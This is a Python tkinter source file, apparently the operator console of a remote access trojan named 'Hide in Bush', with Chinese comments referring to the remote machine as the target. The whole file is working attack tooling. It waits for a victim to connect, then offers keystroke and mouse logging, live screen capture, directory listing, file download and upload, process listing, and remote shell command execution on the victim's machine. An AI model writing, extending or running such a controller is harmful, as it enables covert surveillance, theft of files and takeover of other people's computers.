import tkinter as tk
from tkinter import messagebox, filedialog
from socket_command import *
import re
from PIL import Image, ImageTk
import os
import zipfile


ins_client = socket.socket()
ins_client.bind(('192.168.0.102', 3332))
ins_client.listen(5)

print('waiting for connection...')
ins_server, addr = ins_client.accept()  # ins_server 被控端   addr 被控端ip
print('...connnecting from:', addr)
ins_server.send('hello'.encode("utf-8"))  # 发送hello表示连接

table = tk.Tk()
table.title('Hide in Bush')

screen_width = table.winfo_screenwidth()
screen_height = table.winfo_screenheight()
width = 300
height = 550

location = '%dx%d+%d+%d' % (width, height, (screen_width - width)/2, (screen_height - height)/2)
table.geometry(location)
table.resizable(width=False, height=False)

# '当前靶机为'的文本
victim = tk.Label(
    table,
    text='当前靶机为：',
    font='consola 10 bold',
    width=20,
    height=1,
    anchor='nw'
)
victim.place(x=0,y=0)

# 靶机ip地址的文本
target = tk.StringVar()
target.set(addr)           # 设置靶机地址
t = tk.Label(
    table,
    textvariable=target,   # 使用 textvariable 替换 text, 因为这个是可以变化的
    font='consola 10 bold',
    width=20,
    height=1,
    anchor='nw'
)
t.place(x=82, y=0)


# 文件接受位置文本
l =tk.Label(
    table,
    text='选择文件下载位置：',
    font='consola 10 bold',
    width=15,
    height=1,
    anchor='nw'
)
l.place(x=0, y=40)

# 显示文件接受位置 file_location
file_location = tk.StringVar()
file_location.set('E:\\')
location_text = tk.Label(
    table,
    textvariable=file_location,
    font='consola 10 bold',
    width=200,
    height=2,
    anchor='nw'
)
location_text.place(x=0, y=65)

# 选择文件路径按钮
def select_path():
    path = filedialog.askdirectory()
    file_location.set(path)

select_button = tk.Button(
    table,
    text='选择',
    width=5,
    height=1,
    bg='white',
    command=lambda:select_path()
)
select_button.place(x=250, y=35)


# 获取靶机目录 文本+按钮
column =tk.Label(
    table,
    text='获取靶机目录',
    font='consola 10 bold',
    width=15,
    height=1,
    anchor='nw'
)
column.place(x=0, y=100)

# 获取目录的entry

column_entry = tk.Entry(
    table,
    width=25
)
column_entry.place(x=5, y=125)
column_entry.insert(0, 'D:\\')


def get_column():
    column_target = column_entry.get()
    goal = file_location.get()
    goal = goal + '/scan.txt'
    scan(ins_server, column_target)
    recieve_file(goal)
    column_entry.delete(0, 'end')
    column_entry.insert(0, '已传送指令，请稍后前往确认')

    file = open(goal, "r")
    result = file.read()

    v = tk.Toplevel()
    v.title('返回目录结果')
    v_width = screen_width / 2
    v_height = screen_height / 2

    v_location = '%dx%d+%d+%d' % (v_width, v_height, (screen_width - v_width) / 2, (screen_height - v_height) / 2)
    v.geometry(v_location)
    v.resizable(width=False, height=False)

    re = tk.Text(
        v
    )
    re.insert('insert', result)
    re.pack()

    v.mainloop()


get_column_button = tk.Button(
    table,
    text='确定',
    width=5,
    height=1,
    bg='white',
    command=lambda:get_column()
)
get_column_button.place(x=250, y=95)

# 监听键鼠
kb =tk.Label(
    table,
    text='监听键鼠',
    font='consola 10 bold',
    width=15,
    height=1,
    anchor='nw'
)
kb.place(x=0, y=160)

# 开始/结束按钮及显示文本
kb_text = tk.StringVar()
kb_text.set('开始')
kb_hit = False

running_text = tk.StringVar()
running_text.set('')

def kb_listener():
    global kb_hit
    if kb_hit:
        kb_hit = False
        kb_text.set('开始')
        loc = file_location.get() + '//1.txt'
        monitor_off(ins_server, loc)
        running_text.set('已生成文件，请稍后前往确认')
        file = open(loc, "r")
        result = file.read()

        v = tk.Toplevel()
        v.title('返回键盘结果')
        v_width = screen_width / 2
        v_height = screen_height / 2

        v_location = '%dx%d+%d+%d' % (v_width, v_height, (screen_width - v_width) / 2, (screen_height - v_height) / 2)
        v.geometry(v_location)
        v.resizable(width=False, height=False)

        re = tk.Text(
            v
        )
        re.insert('insert', result)
        re.pack()

        v.mainloop()
    else:
        kb_hit = True
        kb_text.set('结束')
        monitor_on(ins_server)
        running_text.set('监听中...')


kb_button = tk.Button(
    table,
    textvariable=kb_text,
    width=5,
    height=1,
    bg='white',
    command=lambda:kb_listener()
)
kb_button.place(x=250, y=155)

running = tk.Label(
    table,
    textvariable=running_text,
    font='consola 10 bold',
    width=50,
    height=1,
    anchor='nw'
)
running.place(x=0, y=185)

# 监视靶机屏幕
screen_shot =tk.Label(
    table,
    text='监控靶机屏幕',
    font='consola 10 bold',
    width=15,
    height=1,
    anchor='nw'
)
screen_shot.place(x=0, y=220)

def screen_listener():
    v = tk.Toplevel()
    v.title('监控中...')
    v_width = screen_width
    v_height = screen_height

    v_location = '%dx%d+%d+%d' % (v_width, v_height, (screen_width - v_width) / 2, (screen_height - v_height) / 2)
    v.geometry(v_location)
    v.resizable(width=False, height=False)

    image = Image.open('F:\\shot.bmp')
    im = ImageTk.PhotoImage(image)
    pic = tk.Label(v, image=im)
    pic.pack()

    def resize(w, h, w_box, h_box, pil_image):
        f1 = 1.0*w_box/w
        f2 = 1.0*h_box/h

        factor = min([f1, f2])
        width = int(w * factor)
        height = int(h * factor)
        return pil_image.resize((width, height), Image.ANTIALIAS)

    def refresh():
        global im
        screen(ins_server, 'F:\\test.zip')
        fz = zipfile.ZipFile('F:\\test.zip', 'r')
        for file in fz.namelist():
            fz.extract(file, 'F:\\')
        image = Image.open('F:\\test.bmp')
        w, h = image.size
        image = resize(w, h, screen_width, screen_height - 50, image)
        im = ImageTk.PhotoImage(image)
        pic.config(image=im)
        pic.after(1000, refresh)

    pic.after(1000, refresh)

    v.mainloop()


screen_button = tk.Button(
    table,
    text='开始',
    width=5,
    height=1,
    bg='white',
    command=lambda:screen_listener()
)
screen_button.place(x=250, y=215)

# 下载靶机文件
download_file =tk.Label(
    table,
    text='下载靶机文件',
    font='consola 10 bold',
    width=15,
    height=1,
    anchor='nw'
)
download_file.place(x=0, y=280)

# 下载路径的entry
download_entry = tk.Entry(
    table,
    width=25
)
download_entry.place(x=5, y=305)
download_entry.insert(0, '输入准确的路径')

# 下载按钮
def download_file():
    download_path = download_entry.get()
    loc = file_location.get()
    file_name = re.search(r'[^\\]+$', download_path)
    loc = loc + file_name.group(0)
    print(loc)

    download(ins_server, download_path, loc)
    download_entry.delete(0, 'end')
    download_entry.insert(0, '已传送指令，请稍后前往确认')


download_button = tk.Button(
    table,
    text='下载',
    width=5,
    height=1,
    bg='white',
    command=lambda:download_file()
)
download_button.place(x=250, y=275)

# 向靶机传输文件
upload_file =tk.Label(
    table,
    text='向靶机传输文件',
    font='consola 10 bold',
    width=15,
    height=1,
    anchor='nw'
)
upload_file.place(x=0, y=340)

# 选择上传路径
upload_entry = tk.Entry(
    table,
    width=25
)
upload_entry.place(x=5, y=365)
upload_entry.insert(0, '输入准确的路径')

# 本地文件地址
f_l = tk.StringVar()
f_l.set('选择上传的文件')
f_location = tk.Label(
    table,
    textvariable=f_l,
    font='consola 10 bold',
    width=40,
    height=1,
    anchor='nw'
)
f_location.place(x=0, y=390)


# 选择本地文件
def select_file():
    f_l.set(filedialog.askopenfilename())


select = tk.Button(table,
    text='选择',      # 显示按钮上的文字
    width=5, height=1,
    bg='white',
    command=lambda:select_file())     # 点击按钮执行的命令
select.place(x=250, y=385)                # 按钮位置


# 向靶机传输 确认键
def confirm_upload():
    upload_path = upload_entry.get()
    upload_entry.delete(0, 'end')
    file_path = f_l.get()
    file_name = re.search(r'[^/]+$', file_path)
    upload_path = upload_path + file_name.group(0)
    print(upload_path)
    upload(ins_server, upload_path, file_path)
    f_l.set('')


confirm_upload_button = tk.Button(
    table,
    text='确定',
    width=5,
    height=1,
    bg='white',
    command=lambda:confirm_upload()
)
confirm_upload_button.place(x=250, y=335)


# 获取靶机进程
process_file =tk.Label(
    table,
    text='获取文件进程',
    font='consola 10 bold',
    width=15,
    height=1,
    anchor='nw'
)
process_file.place(x=0, y=440)


def confirm_process():
    loc = file_location.get() + '//log.txt'
    process(ins_server, loc)

    file = open(loc, "r")
    result = file.read()
    print(result)
    
    v = tk.Toplevel()
    v.title('返回进程结果')
    v_width = screen_width / 2
    v_height = screen_height / 2

    v_location = '%dx%d+%d+%d' % (v_width, v_height, (screen_width - v_width) / 2, (screen_height - v_height) / 2)
    v.geometry(v_location)
    v.resizable(width=False, height=False)

    re = tk.Text(
        v
    )
    re.insert('insert', result)
    re.pack()

    v.mainloop()


confirm_process_button = tk.Button(
    table,
    text='确定',
    width=5,
    height=1,
    bg='white',
    command=lambda:confirm_process()
)
confirm_process_button.place(x=250, y=435)

# 传输指令
shell_text = tk.Label(
    table,
    text='传输指令',
    font='consola 10 bold',
    width=15,
    height=1,
    anchor='nw'
)
shell_text.place(x=0, y=480)


shell_entry = tk.Entry(
    table,
    width=25
)
shell_entry.place(x=5, y=505)
shell_entry.insert(0, '请输入指令')


def shell_listener():
    cmd = shell_entry.get()
    result = shell(ins_server, cmd)

    v = tk.Toplevel()
    v.title('返回结果')
    v_width = screen_width / 2
    v_height = screen_height / 2

    v_location = '%dx%d+%d+%d' % (v_width, v_height, (screen_width - v_width) / 2, (screen_height - v_height) / 2)
    v.geometry(v_location)
    v.resizable(width=False, height=False)

    re = tk.Text(
        v
    )
    re.insert('insert', result)
    re.pack()

    v.mainloop()


shell_button = tk.Button(
    table,
    text='传输',
    width=5,
    height=1,
    bg='white',
    command=lambda:shell_listener()
)
shell_button.place(x=250, y=475)

table.mainloop()

ins_server.close()                                 # 关闭socket连接
ins_client.close()